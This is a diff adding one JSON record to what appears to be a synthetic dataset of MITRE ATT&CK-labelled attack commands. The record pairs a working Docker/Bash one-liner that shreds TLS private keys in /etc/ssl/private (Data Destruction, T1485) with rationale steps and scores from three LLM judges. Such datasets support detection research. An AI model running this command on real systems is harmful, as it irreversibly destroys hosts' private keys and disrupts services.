@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1485",
+  "platform": "Containers",
+  "shell": "Bash",
+  "command": "docker run --rm -v /etc/ssl/private:/target:rw debian bash -lc 'find /target -maxdepth 1 -type f -name \"*.key\" -print0 | xargs -0 -r shred -n 3 -z -u; sync'",
+  "explanation": "Bind-mounts a targeted host path used by containers for TLS keys and securely overwrites and deletes *.key files, followed by sync.",
+  "rationale_steps": [
+    "Bind-mount the exact TLS key directory to a helper container",
+    "Limit scope to top-level *.key files only",
+    "Use shred with multiple passes and zeroing, then unlink",
+    "Sync writes to disk"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-763669c5-0fb053b1",
+  "source_prompt_hash": "763669c5",
+  "timestamp_utc": "2025-09-30T08:01:03.936632Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for all tools used (docker run, find, xargs, shred), and correct command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1485 Data Destruction technique by using shred to securely overwrite and delete TLS key files in a sensitive directory, making them unrecoverable and potentially disrupting container operations.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T02:16:47.995007Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, valid flags for all utilities, and correct use of command separators (pipe and semicolon).",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely executes data destruction (T1485) by targeting sensitive key files (`*.key` in `/etc/ssl/private`), using `shred` for secure overwriting and deletion, and ensuring persistence with `sync`, which is operationally plausible for an adversary with Docker access.",
+        "combined_score": 5.0,
+        "confidence": null,
+        "timestamp": "2025-10-02T02:17:12.809403Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting, valid docker/run syntax, and correct find/xargs/shred options and separators.",
+        "semantic_score": 5,
+        "semantic_justification": "It bind-mounts the host\u2019s TLS key directory and uses shred to overwrite and delete *.key files followed by sync, achieving data destruction as described (assuming docker access and a filesystem where shred is effective).",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:17:23.769325Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
